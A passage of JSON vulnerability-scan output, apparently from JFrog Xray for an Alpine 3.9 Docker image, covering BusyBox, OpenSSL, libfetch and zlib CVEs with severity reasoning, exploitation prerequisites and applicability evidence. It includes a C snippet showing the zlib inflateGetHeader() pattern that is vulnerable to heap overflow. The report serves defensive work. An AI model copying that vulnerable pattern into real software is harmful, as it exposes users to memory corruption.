devices.\\n\\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `evaluate` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### Development mitigations\\n\\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42383\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42383\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42383\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42383\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the next_input_file function\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:ssl_client:1.29.3-r10\",\n                \"alpine://3.9:busybox:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-190231\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-190231&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\\n\\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `next_input_file` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### Development mitigations\\n\\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42379\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42379\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42379\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42379\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"decompress_gunzip.c in BusyBox through 1.32.1 mishandles the error bit on the huft_build result pointer, with a resultant invalid free or segmentation fault, via malformed gzip data.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:ssl_client:1.29.3-r10\",\n                \"alpine://3.9:busybox:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-149433\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-149433&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"An invalid free in BusyBox can lead to limited denial of service when processing a malformed gzip archive.\",\n                \"full_description\": \"On certain corrupt gzip files, `huft_build` will set the error bit on\\nthe result pointer. If afterwards `abort_unzip` is called `huft_free`\\nmight run into a segmentation fault or an invalid pointer to\\n`free(p)`.\\n\\nThe most common exploitation vector for this issue would be invocation of the `gunzip` BusyBox utility on a malformed gzip archive.\\nSince `gunzip` is almost exclusively invoked as a standalone process, the impact is minimal (crashing the newly-forked `gunzip` process)\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The CVE has no published technical writeup\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue has no exploit published\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue can be exploited by attackers over the network\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Denial of service, usually of forked process\",\n                        \"is_positive\": true\n                    }\n                ]\n            },\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"\",\n                    \"vulnerability_id\": \"CVE-2021-28831\",\n                    \"result\": \"not_covered\"\n                }\n            ]\n        },\n        {\n            \"description\": \"If an X.509 certificate contains a malformed policy constraint and\\npolicy processing is enabled, then a write lock will be taken twice\\nrecursively.  On some operating systems (most widely: Windows) this\\nresults in a denial of service when the affected process hangs.  Policy\\nprocessing being enabled on a publicly facing server is not considered\\nto be a common setup.\\n\\nPolicy processing is enabled by passing the `-policy'\\nargument to the command line utilities or by calling the\\n`X509_VERIFY_PARAM_set1_policies()' function.\\n\\nUpdate (31 March 2023): The description of the policy processing enablement\\nwas corrected based on CVE-2023-0466.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-607927\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-607927&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A design problem in OpenSSL 3.x may lead to denial of service in Windows when processing a malformed policy.\",\n                \"full_description\": \"[OpenSSL](https://www.openssl.org/) is a software library for applications that provide secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites.\\n\\nIt was discovered that when an X.509 certificate contains a bad policy constraint and policy processing is enabled, the write lock is acquired recursively twice.\\nOn Windows, this results in a deadlock and a denial of service when the affected process hangs.\\n\\nThe issue results due to the `ossl_policy_cache_set_mapping()` obtaining the X.509 lock a second time before the `ossl_policy_cache_set()` function releases it.\\n\\nOn Linux using `pthreads` - the second attempt to obtain the lock simply fails without any security impact.\\nOn Windows it seems that attempting to obtain the lock a second time hangs.\\n\\nTo exploit this issue, Policy Processing must be enabled, which is highly unlikely for a publicly-facing server.\\n\\nPolicy processing is enabled by passing the `-policy` argument to the command line utilities or by calling either `X509_VERIFY_PARAM_add0_policy()` or `X509_VERIFY_PARAM_set1_policies()` functions.\\n\\nThis issue only affects the Windows version of OpenSSL 3.x.\",\n                \"jfrog_research_severity\": \"Low\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The issue can be exploited by attackers over the network\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact\",\n                        \"description\": \"The CVSS does not reflect the contextual prerequisites required to exploit the vulnerability.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The attacker must cause OpenSSL 3.x to verify a crafted certificate containing a malformed policy constraint, and the certificate must pass OpenSSL's signature verification (either be signed by a valid CA or any certificate if the client chooses to approve self-signed certificates).\\nAlso, the server must have Policy Processing enabled, which is highly unlikely for a publicly-facing server.\",\n                        \"is_positive\": true\n                    }\n                ]\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2022-3996\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The vulnerability is only exploitable when running under the Windows OS.<br />\\nSince currently only Linux containers are supported, the scanner will always conclude that this vulnerability is not applicable.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The CVE is only applicable on the Windows operating system\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2022-3996\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The vulnerability is only exploitable when running under the Windows OS.<br />\\nSince currently only Linux containers are supported, the scanner will always conclude that this vulnerability is not applicable.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The CVE is only applicable on the Windows operating system\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2022-3996\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2022-3996\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"libfetch before 2021-07-26, as used in apk-tools, xbps, and other products, mishandles numeric strings for the FTP and HTTP protocols. The FTP passive mode implementation allows an out-of-bounds read because strtol is used to parse the relevant numbers into address bytes. It does not check if the line ends prematurely. If it does, the for-loop condition checks for the '\\\\0' terminator one byte too late.\",\n            \"severity\": \"Critical\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:apk-tools:2.10.3-r1\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-180796\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-180796&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\"\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"\",\n                    \"vulnerability_id\": \"CVE-2021-36159\",\n                    \"result\": \"not_covered\"\n                }\n            ]\n        },\n        {\n            \"description\": \"zlib through 1.2.12 has a heap-based buffer over-read or buffer overflow in inflate in inflate.c via a large gzip header extra field. NOTE: only applications that call inflateGetHeader are affected. Some common applications bundle the affected zlib source code but may be unable to call inflateGetHeader (e.g., see the nodejs/node reference).\",\n            \"severity\": \"Critical\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:zlib:1.2.11-r1\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-248482\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-248482&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A heap overflow in zlib can lead to remote code execution when a crafted gzip archive is processed.\",\n                \"full_description\": \"[zlib](https://github.com/madler/zlib) is a popular general purpose data compression library.\\n\\nzlib supports processing gzip archives. As such, it provides the `inflateGetHeader()` method used to get the header information of a gzip archive. The header is always checked for validity, including the header CRC if present. \\nWhen the `inflateGetHeader()` is called, it will make the `inflate()` method read and copy the header of a gzip in a structure passed as a parameter to the `inflateGetHeader()` method, otherwise it will discard the header. If the extra header field is big enough, it will cause the `inflate()` method to be called multiple times to get the full content of this extra field. As there is an improper extra field size check, it can cause a heap buffer overflow.\\nThe vulnerability can be exploited if and only if the target program calls `inflateGetHeader()`.\\nThe attacker should find a remote input that propagates to the `inflate()` method with the `inflateGetHeader()` method being called.\\n\\nExample:\\n```\\nz_stream strm;\\ngz_header head;\\n\\nif ((r = inflateInit2(&strm, stream_size)) != Z_OK)\\n\\tgoto fail;\\nif ((r = inflateGetHeader(&strm, &head)) != Z_OK) {\\n\\tinflateEnd(&strm);\\n\\tgoto fail;\\n}\\nr = inflate(&strm, Z_NO_FLUSH);\\n```\\nThe above code is vulnerable as it is calling the `inflateGetHeader()` method and the `inflate()` method for crafter gzip header.\",\n                \"jfrog_research_severity\": \"High\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker must find a way to upload a crafted gzip archive, that is subsequently processed by a `inflate()` call with `inflateGetHeader()` being called before.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue has an exploit published\",\n                        \"description\": \"PoC demonstrates a heap overflow that crashes the application. Although not demonstrated, it is likely that an RCE exploit could be developed, since gzip-processing may allow many heap-shaping primitives needed for a full RCE exploit.\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The issue results in a severe impact (such as remote code execution)\",\n                        \"description\": \"Heap overflow leading to code execution\",\n                        \"is_positive\": false\n                    }\n                ]\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:zlib:1.2.11-r1\",\n                    \"cve_id\": \"CVE-2022-37434\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks whether the vulnerable function <code>inflateGetHeader()</code> is called.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable library zlib is never included\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:zlib:1.2.11-r1\",\n                    \"vulnerability_id\": \"CVE-2022-37434\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_i function\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:busybox:1.29.3-r10\",\n                \"alpine://3.9:ssl_client:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-190232\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-190232&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\\n\\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `getvar_i` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### Development mitigations\\n\\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42378\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42378\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42378\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42378\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the getvar_s function\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:ssl_client:1.29.3-r10\",\n                \"alpine://3.9:busybox:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-190228\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-190228&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\\n\\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `getvar_s` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### Development mitigations\\n\\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42382\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            